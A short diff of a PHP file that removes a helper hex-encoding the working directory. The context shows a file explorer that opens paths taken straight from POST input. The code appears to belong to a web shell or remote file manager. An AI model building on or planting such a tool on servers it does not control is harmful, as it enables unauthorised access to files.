@@ -8,10 +8,6 @@ $p = array_map("to_encode", get_post());
 $cwd = html_safe(get_cwd());
 $GLOBALS['module'] = array();
 
-function encode_cwd($cwd) {
-    return bin2hex(from_encode($cwd));
-}
-
 $explorer_content = "";
 if(isset($p['viewEntry'])){
 	$path = trim($p['viewEntry']);
